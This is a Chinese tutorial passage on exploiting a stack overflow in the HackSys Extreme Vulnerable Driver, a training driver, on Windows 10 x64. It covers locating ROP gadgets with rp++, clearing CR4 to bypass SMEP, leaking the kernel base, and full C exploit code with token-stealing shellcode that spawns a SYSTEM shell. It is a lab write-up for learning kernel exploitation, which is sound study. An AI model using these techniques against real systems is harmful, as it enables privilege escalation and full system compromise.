**smep绕过&&rp++工具的使用**
怎么绕过smep?这里用到了一种名为rop的技术.就是用ring0的代码将smep给关掉.前面我们已经说过,smep与cr4寄存器的第20位有关,所以我们要把cr4寄存器的第20位给置零.在我的机器上也就是把0x1506f8改成0x506f8.怎么更改cr4寄存器的值?我们需要找内核里的与cr4寄存器相关的汇编片段  
当然这里还需要绕过KALSR,也就是内核态的ALSR.  
这里我用到了一种工具,rp++
首先在win10虚拟机里查找 ntoskrnl.exe 程序,如图
然后新建一个rop.txt程序(叫什么名字都可以)  
然后打开cmd,把相关的程序拖进去,输入指令,格式像这样
然后我们发现rop.txt文件里多了很多东西,然后我们用ctrl + f 查找cr4寄存器相关可以找到
然后我们将前面的140内存基址给去掉,取后面的0xf732c,然后在windbg中输入 uf nt+0xf732c,可以看到
然后输入?fffff802`d2d7f32c-nt 可以看到
(我这里应该显示有问题它cr4给我显示成了tmm有点无语emmmm)  
那么我们的偏移就是0xf732c,获取rcx寄存器的值类似然后我的代码长这样
那么怎么获得内核的基址呢?这部分当成公式用就好…大概这样
**shellcode的编写**
shellcode的编写就是按着我前面讲的内容写的,手动找一下64位下的偏移即可,不过值得注意的是,asm汇编程序不能直接在.c文件里写.这里我用的是一款在线将汇编转机器码的工具.[链接在这](https://defuse.ca/online-x86-assembler.htm#disassembly)  
可能有人会好奇为啥我会有mov rbx,[r11+0x60]这条指令,这是调出来的.待会解释.
**运行**
我在exploit里面加了 __debugbreak(); 这行代码,这行代码是下断点用的
运行后可以看到我们的代码已经断下来了
然后,我们再输入 uf HEVD!TriggerStackOverflow 并在这个函数的结尾处下个断点
然后运行到修改cr4寄存器的地方,可以看到,我们的cr4寄存器已经被修改成功
接下来解释一下mov rbx,[r11+0x60]这条指令  
我们知道我们的rcx,rbx在运行shellcode之前就被破坏掉了,所以一个很朴素的想法就是找一个相近的值给他恢复,调试后发现rcx的值无关紧要,因为如果程序正常运行的话,后面并没有引用到rcx的值,但是用到了rbx的值,如果rbx的值不对,将直接导致系统崩溃.  
一个很直接的想法就是,找一个相近的值,然后减去差值.  
调试发现rbx的值是r11赋予的也就是这
但是r11里面的值也会被破坏掉,也就是说[r11+10h]不可用  
调试发现[r11+10h]和[r11+60h]这两个值一模一样,而且后面这个不会被改掉.  
也就是这个值
接下来就没什么好说的了,最后贴一下我的代码
    #include
    #include
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define HACKSYS_EVD_IOCTL_STACK_OVERFLOW                  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
    const char kDevName[] = "\\\\.\\HackSysExtremeVulnerableDriver";
    static VOID CreateCmd()
    {
        STARTUPINFO si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_SHOW;
        WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
        BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
        if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
    }
    HANDLE open_device(const char* device_name)
    {
        HANDLE device = CreateFileA(device_name,
            GENERIC_READ | GENERIC_WRITE,
            NULL,
            NULL,
            OPEN_EXISTING,
            NULL,
            NULL
        );
        return device;
    }
    #define BUFF_SIZE   2080
    typedef enum _SYSTEM_INFORMATION_CLASS {
        SystemModuleInformation = 11,
        SystemHandleInformation = 16
    } SYSTEM_INFORMATION_CLASS;
    typedef NTSTATUS(WINAPI* NtQuerySystemInformation_t)(IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
        OUT PVOID                   SystemInformation,
        IN ULONG                    SystemInformationLength,
        OUT PULONG                  ReturnLength);
    #define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
    typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
        ULONG                Reserved1;
        ULONG                Reserved2;
        ULONG                Reserved3;
        PVOID                Base;
        ULONG                ImageSize;
        ULONG                Flags;
        WORD                 Id;
        WORD                 Rank;
        WORD                 LoadCount;
        WORD                 NameOffset;
        CHAR                 Name[256];
    } SYSTEM_MODULE_INFORMATION_ENTRY, * PSYSTEM_MODULE_INFORMATION_ENTRY;
    typedef struct _SYSTEM_MODULE_INFORMATION {
        ULONG   Count;
        SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
    } SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;
    INT64 get_kernel_base() {
        NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
        ULONG ReturnLength;
        HMODULE hNtDll = LoadLibrary(L"ntdll.dll");
        NtQuerySystemInformation_t NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(hNtDll, "NtQuerySystemInformation");
        NtStatus = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &ReturnLength);
        PSYSTEM_MODULE_INFORMATION pSystemModuleInformation = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(),
            HEAP_ZERO_MEMORY,
            ReturnLength);
        NtStatus = NtQuerySystemInformation(SystemModuleInformation,
            pSystemModuleInformation,
            ReturnLength,
            &ReturnLength);
        PVOID KernelBaseAddressInKernelMode = pSystemModuleInformation->Module[0].Base;
        return (INT64)KernelBaseAddressInKernelMode;
    }
    BYTE shellcode[] =
    "\x65\x4C\x8B\x04\x25\x88\x01\x00\x00"     //mov r8,[gs:0x188]
    "\x4D\x8B\x80\xB8\x00\x00\x00"             //mov r8,[r8+0xb8]
    "\x4D\x89\xC1"                             //mov r9,r8            //
    "\x49\xC7\xC4\x04\x00\x00\x00"             //mov r12,4
    //searchsystemPID
    "\x4D\x8B\x80\xF0\x02\x00\x00"             //mov r8,[r8+0x2F0]        /
    "\x49\x81\xE8\xF0\x02\x00\x00"                 //sub r8,0x2F0          /
    "\x4D\x39\xA0\xE8\x02\x00\x00"              //cmp [r8+0x2e8],r12
    "\x75\xE9"                                 // jne searchsystemPID
    "\x4D\x8B\xA0\x58\x03\x00\x00"              //mov rdx,[rax+0x358]
    "\x4D\x89\xA1\x58\x03\x00\x00"              //mov [rcx+0x358],rdx
    "\x49\x8B\x5B\x60"                            //mov rbx,[r11+0x60]
    "\x4D\x31\xC0\x4D\x31\xC9\x4D\x31\xE4" // xor   r8 r9 r12
    "\x48\x83\xC4\x10"                          // add rsp,0x10
    "\xc3";
    int main()
    {
        ULONG BytesReturned;
        BYTE input_buff[2088] = { 0 };
        INT64 KernelBaseAddressInKernelMode = get_kernel_base();
        INT64 pop_rcx_offset = KernelBaseAddressInKernelMode + 0x95836;
        INT64 rcx_value = 0x506f8;
        INT64 mov_cr4_ret = KernelBaseAddressInKernelMode + 0xf732c;
        LPVOID shellcode_addr = VirtualAlloc(NULL,
            sizeof(shellcode),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);
        //HMODULE ntoskrnl = LoadLibrary(L"ntoskrnl.exe");
        memcpy(shellcode_addr, shellcode, sizeof(shellcode));
        memset(input_buff, '\x41', 2056);
        memcpy(input_buff + 2056, (PINT64)&pop_rcx_offset, 8); // pop rcx
        memcpy(input_buff + 2064, (PINT64)&rcx_value, 8); // disable SMEP value
        memcpy(input_buff + 2072, (PINT64)&mov_cr4_ret, 8);
        memcpy(input_buff + 2080, (PINT64)&shellcode_addr, 8);
        printf("                              gamous,yyds!!!");
        HANDLE hFile = open_device(kDevName);
        __debugbreak();
        DeviceIoControl(hFile,
            HACKSYS_EVD_IOCTL_STACK_OVERFLOW,
            (PVOID)input_buff,
            //0x800,
            sizeof(input_buff),
            NULL,
            0,
            &BytesReturned,
            NULL);
        CreateCmd();
    }
可以看到,最后是运行成功了的
## 0x04:总结&&感想&&参考
感觉这个并没有想象中的那么难.还有这本书值得一读,书中的很多理念都有让我眼前一亮的感觉,虽然这本书出版于2008年.  
碰到问题不要一个劲的莽,要学会动脑.还有就是英语要好,这些文章我大部分都是拿翻译看的.感觉自己表达能力还是差了,没有写出我想要的效果..还有就是我这输入法不知道有什么问题,标点符号用不了中文的,改了也用不了…
###  环境搭建参考
###  学习资料参考
第四章  
滴水逆向三期视频 2015-01-21部分